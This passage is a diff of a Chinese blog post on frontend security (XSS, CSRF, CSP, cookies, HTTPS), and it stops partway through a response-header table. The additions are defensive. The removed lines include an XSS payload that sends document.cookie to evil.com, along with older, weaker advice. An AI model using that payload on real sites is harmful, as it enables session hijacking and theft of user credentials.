@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <meta name="description" content="前端开发中必须了解的安全知识：XSS 攻击与防御、CSRF 原理与 Token 机制、HTTPS 与 CSP 内容安全策略" />
+    <meta name="description" content="前端安全的重点是正确处理不可信内容、配合服务端会话策略并限制浏览器能力。本文覆盖 XSS、CSRF、CSP、Cookie 和安全响应头的真实边界。" />
     <title>前端安全防护指南：XSS、CSRF 与 HTTPS | 前端技术笔记</title>
     <link rel="alternate" href="/web-blog/atom.xml" title="前端技术笔记" type="application/atom+xml" />
     <link rel="stylesheet" href="/web-blog/css/main.css" />
@@ -31,123 +31,84 @@
 <main class="shell post-shell">
   <aside class="post-toc" aria-label="文章目录">
     <p class="section-label">ON THIS PAGE</p>
-    <ol class="toc-list"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-list-text">前言</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E4%B8%80%E3%80%81XSS%EF%BC%88%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%89"><span class="toc-list-text">一、XSS（跨站脚本攻击）</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#1-1-%E4%BB%80%E4%B9%88%E6%98%AF-XSS"><span class="toc-list-text">1.1 什么是 XSS</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#1-2-XSS-%E7%A4%BA%E4%BE%8B"><span class="toc-list-text">1.2 XSS 示例</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#1-3-%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88"><span class="toc-list-text">1.3 防御方案</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-4"><a class="toc-list-link" href="#%E6%96%B9%E6%A1%88-1%EF%BC%9A%E8%BD%AC%E4%B9%89%E8%BE%93%E5%87%BA%EF%BC%88%E6%9C%80%E6%A0%B8%E5%BF%83%EF%BC%89"><span class="toc-list-text">方案 1：转义输出（最核心）</span></a></li><li class="toc-list-item toc-list-level-4"><a class="toc-list-link" href="#%E6%96%B9%E6%A1%88-2%EF%BC%9A%E8%AE%BE%E7%BD%AE-Content-Security-Policy"><span class="toc-list-text">方案 2：设置 Content-Security-Policy</span></a></li><li class="toc-list-item toc-list-level-4"><a class="toc-list-link" href="#%E6%96%B9%E6%A1%88-3%EF%BC%9AHttpOnly-Cookie"><span class="toc-list-text">方案 3：HttpOnly Cookie</span></a></li></ol></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E4%BA%8C%E3%80%81CSRF%EF%BC%88%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%89"><span class="toc-list-text">二、CSRF（跨站请求伪造）</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#2-1-%E4%BB%80%E4%B9%88%E6%98%AF-CSRF"><span class="toc-list-text">2.1 什么是 CSRF</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#2-2-%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88"><span class="toc-list-text">2.2 防御方案</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-4"><a class="toc-list-link" href="#%E6%96%B9%E6%A1%88-1%EF%BC%9ASameSite-Cookie%EF%BC%88%E6%9C%80%E6%8E%A8%E8%8D%90%EF%BC%89"><span class="toc-list-text">方案 1：SameSite Cookie（最推荐）</span></a></li><li class="toc-list-item toc-list-level-4"><a class="toc-list-link" href="#%E6%96%B9%E6%A1%88-2%EF%BC%9ACSRF-Token"><span class="toc-list-text">方案 2：CSRF Token</span></a></li><li class="toc-list-item toc-list-level-4"><a class="toc-list-link" href="#%E6%96%B9%E6%A1%88-3%EF%BC%9A%E9%AA%8C%E8%AF%81-Referer-Origin"><span class="toc-list-text">方案 3：验证 Referer&#x2F;Origin</span></a></li></ol></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E4%B8%89%E3%80%81HTTPS"><span class="toc-list-text">三、HTTPS</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#3-1-%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81-HTTPS"><span class="toc-list-text">3.1 为什么需要 HTTPS</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#3-2-%E5%89%8D%E7%AB%AF%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-list-text">3.2 前端注意事项</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E5%9B%9B%E3%80%81%E5%85%B6%E4%BB%96%E5%AE%89%E5%85%A8%E5%AE%9E%E8%B7%B5"><span class="toc-list-text">四、其他安全实践</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#4-1-%E9%98%B2-SQL-%E6%B3%A8%E5%85%A5"><span class="toc-list-text">4.1 防 SQL 注入</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#4-2-JWT-%E5%AE%89%E5%85%A8%E5%AD%98%E5%82%A8"><span class="toc-list-text">4.2 JWT 安全存储</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#4-3-%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81%E9%98%B2%E5%BE%A1"><span class="toc-list-text">4.3 点击劫持防御</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#4-4-%E8%BE%93%E5%85%A5%E6%A0%A1%E9%AA%8C"><span class="toc-list-text">4.4 输入校验</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E4%BA%94%E3%80%81%E5%AE%89%E5%85%A8%E5%A4%B4%E9%80%9F%E6%9F%A5"><span class="toc-list-text">五、安全头速查</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-list-text">总结</span></a></li></ol>
+    <ol class="toc-list"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E5%89%8D%E7%AB%AF%E4%B8%8D%E8%83%BD%E6%9B%BF%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%81%9A%E5%AE%89%E5%85%A8%E5%86%B3%E7%AD%96"><span class="toc-list-text">前端不能替服务端做安全决策</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#XSS%EF%BC%9A%E9%BB%98%E8%AE%A4%E8%BD%AC%E4%B9%89%EF%BC%8C%E4%BE%8B%E5%A4%96%E8%A6%81%E5%87%80%E5%8C%96"><span class="toc-list-text">XSS：默认转义，例外要净化</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#CSP-%E6%98%AF%E7%AC%AC%E4%BA%8C%E9%81%93%E9%98%B2%E7%BA%BF"><span class="toc-list-text">CSP 是第二道防线</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#CSRF%EF%BC%9A%E5%8F%96%E5%86%B3%E4%BA%8E%E8%AE%A4%E8%AF%81%E6%96%B9%E5%BC%8F"><span class="toc-list-text">CSRF：取决于认证方式</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E4%BC%9A%E8%AF%9D%E5%92%8C-HTTPS-%E9%83%BD%E7%94%B1%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AE%BE%E7%BD%AE"><span class="toc-list-text">会话和 HTTPS 都由服务端设置</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E5%93%8D%E5%BA%94%E5%A4%B4%E9%9C%80%E8%A6%81%E6%8C%89%E5%9C%BA%E6%99%AF%E7%BB%84%E5%90%88"><span class="toc-list-text">响应头需要按场景组合</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E5%8F%91%E5%B8%83%E5%89%8D%E6%A3%80%E6%9F%A5"><span class="toc-list-text">发布前检查</span></a></li></ol>
   </aside>
   <article class="post-content" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
     <header class="post-header">
       <p class="section-label">安全</p>
       <h1 itemprop="headline">前端安全防护指南：XSS、CSRF 与 HTTPS</h1>
-      <div class="metadata"><span>2026-02-10</span><span>4 分钟阅读</span><span>更新于 2026-06-23</span></div>
-      <p class="post-lede">前端开发中必须了解的安全知识：XSS 攻击与防御、CSRF 原理与 Token 机制、HTTPS 与 CSP 内容安全策略</p>
+      <div class="metadata"><span>2026-02-10</span><span>4 分钟阅读</span><span>更新于 2026-08-10</span></div>
+      <p class="post-lede">前端安全的重点是正确处理不可信内容、配合服务端会话策略并限制浏览器能力。本文覆盖 XSS、CSRF、CSP、Cookie 和安全响应头的真实边界。</p>
     </header>
-    <div class="prose" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前端安全不是后端专属的责任。<strong>XSS 攻击、CSRF 伪造请求、敏感信息泄露</strong>——这些安全威胁如果不了解，你的项目随时可能被攻击。</p>
-<p>本文聚焦前端能做的安全防护，不讲空泛的概念，直接给可落地的方案。</p>
-<hr>
-<h2 id="一、XSS（跨站脚本攻击）"><a href="#一、XSS（跨站脚本攻击）" class="headerlink" title="一、XSS（跨站脚本攻击）"></a>一、XSS（跨站脚本攻击）</h2><h3 id="1-1-什么是-XSS"><a href="#1-1-什么是-XSS" class="headerlink" title="1.1 什么是 XSS"></a>1.1 什么是 XSS</h3><p>攻击者在网页中注入恶意脚本，当用户访问时执行该脚本，从而窃取 cookie、token 等信息。</p>
-<p><strong>三种类型：</strong></p>
+    <div class="prose" itemprop="articleBody"><h2 id="前端不能替服务端做安全决策"><a href="#前端不能替服务端做安全决策" class="headerlink" title="前端不能替服务端做安全决策"></a>前端不能替服务端做安全决策</h2><p>前端校验能让用户更早看到错误，却不能阻止攻击者绕开界面直接调用接口。权限判断、数据校验、Cookie 属性和响应头必须由服务端执行；前端的责任是避免把不可信数据变成可执行内容，并按约定安全地发起请求。</p>
+<p>先把边界记住：用户输入、富文本、URL 参数、接口响应和第三方脚本都应当作不可信来源。只要其中任何一项进入 HTML、JavaScript URL 或敏感操作，就需要明确的处理规则。</p>
+<h2 id="XSS：默认转义，例外要净化"><a href="#XSS：默认转义，例外要净化" class="headerlink" title="XSS：默认转义，例外要净化"></a>XSS：默认转义，例外要净化</h2><p>Vue 的插值会转义文本，下面的写法会把输入当作文字显示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&#123;&#123; comment.body &#125;&#125;&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+
+<p>风险通常来自 <code>v-html</code>、直接操作 <code>innerHTML</code>、拼接事件属性，或把用户可控字符串放进 URL。若产品必须展示富文本，先在受信任的服务端或浏览器端使用经过维护的净化器，并只允许业务需要的标签和属性。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import DOMPurify from &#x27;dompurify&#x27;</span><br><span class="line">import &#123; computed &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">const props = defineProps&lt;&#123; html: string &#125;&gt;()</span><br><span class="line"></span><br><span class="line">const safeHtml = computed(() =&gt;</span><br><span class="line">  DOMPurify.sanitize(props.html, &#123; USE_PROFILES: &#123; html: true &#125; &#125;),</span><br><span class="line">)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;article v-html=&quot;safeHtml&quot; /&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>
+
+<p>净化不是一次性配置。富文本组件升级、允许的链接协议和图片来源变化后，都要重新检查策略。涉及评论、运营编辑器或 Markdown 渲染时，服务端也要在保存或输出的边界重复执行校验。</p>
+<h2 id="CSP-是第二道防线"><a href="#CSP-是第二道防线" class="headerlink" title="CSP 是第二道防线"></a>CSP 是第二道防线</h2><p>Content Security Policy 不能弥补不安全的 <code>v-html</code>，但能在注入发生时限制脚本加载和执行范围。应在 HTTP 响应头中设置它；<code>meta</code> 形式有能力限制，不能替代完整的服务端策略。</p>
+<p>下面是一个需要按项目资源来源调整的起点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy:</span><br><span class="line">  default-src &#x27;self&#x27;;</span><br><span class="line">  script-src &#x27;self&#x27; &#x27;nonce-&#123;per-response-nonce&#125;&#x27;;</span><br><span class="line">  object-src &#x27;none&#x27;;</span><br><span class="line">  base-uri &#x27;self&#x27;;</span><br><span class="line">  frame-ancestors &#x27;none&#x27;;</span><br><span class="line">  upgrade-insecure-requests</span><br></pre></td></tr></table></figure>
+
+<p>nonce 必须为每个响应随机生成，并同时写入允许执行的内联脚本。不要为了让旧代码工作就加入 <code>&#39;unsafe-inline&#39;</code> 或把一长串未知 CDN 放进 <code>script-src</code>。先以 Report-Only 模式观察违规报告，再逐步切换为强制策略，能减少线上误拦截。</p>
+<h2 id="CSRF：取决于认证方式"><a href="#CSRF：取决于认证方式" class="headerlink" title="CSRF：取决于认证方式"></a>CSRF：取决于认证方式</h2><p>CSRF 主要影响浏览器会自动携带认证 Cookie 的站点。<code>SameSite</code> 能降低跨站携带 Cookie 的机会，但不能替代服务端对敏感写操作的验证。选择 <code>Lax</code>、<code>Strict</code> 或 <code>None; Secure</code> 前，要先确认登录跳转、嵌入页面和跨站支付回跳等真实流程。</p>
+<p>使用 Cookie 会话时，常见组合是服务端校验 <code>Origin</code> 或 <code>Referer</code>，并为状态改变请求校验不可预测的 CSRF Token：</p>
+<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> fetch(<span class="string">&#x27;/api/profile&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;PATCH&#x27;</span>,</span><br><span class="line">  <span class="attr">credentials</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">  <span class="attr">headers</span>: &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X-CSRF-Token&#x27;</span>: csrfToken,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">body</span>: <span class="built_in">JSON</span>.stringify(&#123; displayName &#125;),</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>Token 的生成、绑定和校验在服务端完成。前端只从受控页面读取它并随请求发送，不能把“请求带了 token”误认为已经得到授权。</p>
+<h2 id="会话和-HTTPS-都由服务端设置"><a href="#会话和-HTTPS-都由服务端设置" class="headerlink" title="会话和 HTTPS 都由服务端设置"></a>会话和 HTTPS 都由服务端设置</h2><p>前端 JavaScript 不能给 Cookie 加 <code>HttpOnly</code>，也不能配置 HSTS。一个会话 Cookie 的属性由服务端响应设置，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: __Host-session=&lt;opaque-value&gt;; Path=/; HttpOnly; Secure; SameSite=Lax</span><br></pre></td></tr></table></figure>
+
+<p><code>__Host-</code> 前缀要求 <code>Secure</code>、<code>Path=/</code>，且不能设置 <code>Domain</code>，能减少子域覆盖 Cookie 的风险。是否使用 Cookie、内存令牌或其他认证模型，取决于威胁模型和产品流程；把令牌放进 <code>localStorage</code> 会在 XSS 成功时扩大泄露面，并不是通用默认方案。</p>
+<p>HTTPS 应覆盖所有页面和静态资源。不要在 HTTPS 页面加载 HTTP 资源，也不要用协议相对 URL 掩盖配置问题。确认全站 HTTPS 后，再由服务端启用 HSTS；预加载或 <code>includeSubDomains</code> 是难以回退的决策，必须评估所有子域。</p>
+<h2 id="响应头需要按场景组合"><a href="#响应头需要按场景组合" class="headerlink" title="响应头需要按场景组合"></a>响应头需要按场景组合</h2><p>以下响应头由服务端或 CDN 配置。它们不是一段可复制到所有项目的模板：</p>
 <table>
 <thead>
 <tr>
-<th>类型</th>
-<th>原理</th>
-<th>危害</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>存储型</strong></td>
-<td>恶意代码存到服务器（如评论区）</td>
-<td>最大（持久化）</td>
-</tr>
-<tr>
-<td><strong>反射型</strong></td>
-<td>恶意代码在 URL 参数中</td>
-<td>中（需诱导点击）</td>
-</tr>
-<tr>
-<td><strong>DOM 型</strong></td>
-<td>通过前端 JS 动态注入</td>
-<td>中</td>
-</tr>
-</tbody></table>
-<h3 id="1-2-XSS-示例"><a href="#1-2-XSS-示例" class="headerlink" title="1.2 XSS 示例"></a>1.2 XSS 示例</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 攻击者在评论框输入： --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;fetch(&#x27;https://evil.com/steal?cookie=&#x27; + document.cookie)&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="1-3-防御方案"><a href="#1-3-防御方案" class="headerlink" title="1.3 防御方案"></a>1.3 防御方案</h3><h4 id="方案-1：转义输出（最核心）"><a href="#方案-1：转义输出（最核心）" class="headerlink" title="方案 1：转义输出（最核心）"></a>方案 1：转义输出（最核心）</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 手动转义 HTML 特殊字符</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> div = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>)</span><br><span class="line">  div.appendChild(<span class="built_in">document</span>.createTextNode(str))</span><br><span class="line">  <span class="keyword">return</span> div.innerHTML</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 现代框架自动处理：</span></span><br><span class="line"><span class="comment">// Vue: &#123;&#123; data &#125;&#125; 默认转义</span></span><br><span class="line"><span class="comment">// React: &#123;data&#125; 默认转义</span></span><br><span class="line"><span class="comment">// 除非使用 v-html / dangerouslySetInnerHTML</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="方案-2：设置-Content-Security-Policy"><a href="#方案-2：设置-Content-Security-Policy" class="headerlink" title="方案 2：设置 Content-Security-Policy"></a>方案 2：设置 Content-Security-Policy</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 只允许同源脚本执行 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nginx 配置 CSP</span></span><br><span class="line"><span class="attribute">add_header</span> Content-Security-Policy <span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27; https://cdn.example.com; style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<h4 id="方案-3：HttpOnly-Cookie"><a href="#方案-3：HttpOnly-Cookie" class="headerlink" title="方案 3：HttpOnly Cookie"></a>方案 3：HttpOnly Cookie</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置 cookie 时加 HttpOnly 标记</span></span><br><span class="line"><span class="comment">// 这样 JS 无法通过 document.cookie 读取</span></span><br><span class="line"><span class="built_in">Set</span>-Cookie: sessionid=xxx; HttpOnly; Secure; SameSite=Strict</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="二、CSRF（跨站请求伪造）"><a href="#二、CSRF（跨站请求伪造）" class="headerlink" title="二、CSRF（跨站请求伪造）"></a>二、CSRF（跨站请求伪造）</h2><h3 id="2-1-什么是-CSRF"><a href="#2-1-什么是-CSRF" class="headerlink" title="2.1 什么是 CSRF"></a>2.1 什么是 CSRF</h3><p>用户登录了银行网站 A，然后访问了恶意网站 B。B 网站构造了一个请求（转账），因为浏览器自动携带了 A 网站的 cookie，请求看起来是”合法”的。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用户登录 bank.com → 获得 cookie</span><br><span class="line">用户访问 evil.com → evil.com 构造请求 POST bank.com/transfer</span><br><span class="line">浏览器自动带上 cookie → 银行以为是用户本人操作</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-2-防御方案"><a href="#2-2-防御方案" class="headerlink" title="2.2 防御方案"></a>2.2 防御方案</h3><h4 id="方案-1：SameSite-Cookie（最推荐）"><a href="#方案-1：SameSite-Cookie（最推荐）" class="headerlink" title="方案 1：SameSite Cookie（最推荐）"></a>方案 1：SameSite Cookie（最推荐）</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置 cookie 时指定 SameSite 属性</span></span><br><span class="line"><span class="built_in">Set</span>-Cookie: sessionid=xxx; SameSite=Strict; Secure</span><br><span class="line"></span><br><span class="line"><span class="comment">// SameSite 取值：</span></span><br><span class="line"><span class="comment">// Strict: 完全禁止跨站携带（最安全）</span></span><br><span class="line"><span class="comment">// Lax: GET 请求可以携带（默认值，兼顾体验）</span></span><br><span class="line"><span class="comment">// None: 不做限制（必须配合 Secure）</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="方案-2：CSRF-Token"><a href="#方案-2：CSRF-Token" class="headerlink" title="方案 2：CSRF Token"></a>方案 2：CSRF Token</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 后端生成随机 token，嵌入到表单中 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/transfer&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;_csrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;随机token&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span>&gt;</span>转账<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="方案-3：验证-Referer-Origin"><a href="#方案-3：验证-Referer-Origin" class="headerlink" title="方案 3：验证 Referer/Origin"></a>方案 3：验证 Referer/Origin</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nginx 检查请求来源</span></span><br><span class="line"><span class="attribute">if</span> ($http_origin !<span class="regexp">~ &#x27;^https?://(yourdomain.com)&#x27;)</span> &#123;</span><br><span class="line">  <span class="attribute">return</span> <span class="number">403</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="三、HTTPS"><a href="#三、HTTPS" class="headerlink" title="三、HTTPS"></a>三、HTTPS</h2><h3 id="3-1-为什么需要-HTTPS"><a href="#3-1-为什么需要-HTTPS" class="headerlink" title="3.1 为什么需要 HTTPS"></a>3.1 为什么需要 HTTPS</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP: 明文传输 → 中间人可以窃听、篡改</span><br><span class="line">HTTPS: TLS 加密 → 防窃听、防篡改、防冒充</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-2-前端注意事项"><a href="#3-2-前端注意事项" class="headerlink" title="3.2 前端注意事项"></a>3.2 前端注意事项</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 混合内容问题：HTTPS 页面不要加载 HTTP 资源 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://cdn.example.com/script.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- ❌ 浏览器会阻止（或提示不安全） --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 使用相对协议或 HTTPS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//cdn.example.com/script.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.example.com/script.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="四、其他安全实践"><a href="#四、其他安全实践" class="headerlink" title="四、其他安全实践"></a>四、其他安全实践</h2><h3 id="4-1-防-SQL-注入"><a href="#4-1-防-SQL-注入" class="headerlink" title="4.1 防 SQL 注入"></a>4.1 防 SQL 注入</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ❌ 直接拼接 SQL</span></span><br><span class="line"><span class="keyword">const</span> query = <span class="string">`SELECT * FROM users WHERE id = <span class="subst">$&#123;userId&#125;</span>`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ✅ 使用参数化查询（ORM 或 prepared statements）</span></span><br><span class="line"><span class="keyword">const</span> query = <span class="string">&#x27;SELECT * FROM users WHERE id = ?&#x27;</span></span><br><span class="line">db.execute(query, [userId])</span><br></pre></td></tr></table></figure>
-
-<h3 id="4-2-JWT-安全存储"><a href="#4-2-JWT-安全存储" class="headerlink" title="4.2 JWT 安全存储"></a>4.2 JWT 安全存储</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ❌ 将 token 存在 localStorage</span></span><br><span class="line"><span class="built_in">localStorage</span>.setItem(<span class="string">&#x27;token&#x27;</span>, jwtToken)</span><br><span class="line"><span class="comment">// XSS 攻击可读取: localStorage.getItem(&#x27;token&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ✅ 存在 httpOnly cookie 中（后端设置）</span></span><br><span class="line"><span class="comment">// ✅ 或存在内存变量中（刷新页面丢失）</span></span><br><span class="line"><span class="comment">// ✅ 使用刷新 token 机制</span></span><br></pre></td></tr></table></figure>
-
